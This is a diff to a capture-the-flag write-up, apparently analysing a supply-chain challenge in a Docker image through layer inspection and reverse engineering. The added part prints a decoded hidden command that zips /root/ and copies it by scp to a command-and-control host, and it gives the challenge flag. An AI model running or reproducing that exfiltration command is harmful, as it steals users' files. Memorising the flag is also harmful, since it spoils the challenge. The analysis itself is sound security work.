@@ -34,7 +34,8 @@ sudo dive hackazon/micro_ghost
 
 Once I did, I got a gui that shows us how the files in the container changed:
 
-![dive.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/194ddd05-05fe-4a09-860e-e7ad922a8185/dive.png)
+![dive](https://user-images.githubusercontent.com/74945479/181754131-7aea45ad-40ed-439a-a21e-79d9d70d978c.png)
+
 
  The final change was that a file called libc.so.evil.6 was removed from opt/ after being run. Seems strange. 
 
@@ -345,3 +346,11 @@ void FUN_00101169(char *param_1)
 ```
 
 The first function seems to act as a set-up function by defining a global array with each index being equal to a hexadecimal value and passing the second function a seemingly random string. The second function then uses these and some local variables to make a command that gets executed by the system. We can reconstruct these functions in C.
+You can find my script in reverse.c in this github. When I run my script I get the following output:
+
+```php
+└─$ ./a.out 
+echo "Nope";v1="CTF{C0n7r0Ll1NG_";zip -r exf.zip /root/;scp exf.zip root@c2.maldomain.del:/yeet_data/;v2="5h3_5uppLy_";rm exf.zip;v3="Ch41n_15_7h3_K#Y!!!!}";echo "GG";
+```
+
+revealing that our key is CTF{C0n7r0Ll1NG_5h3_5uppLy_Ch41n_15_7h3_K#Y!!!!}
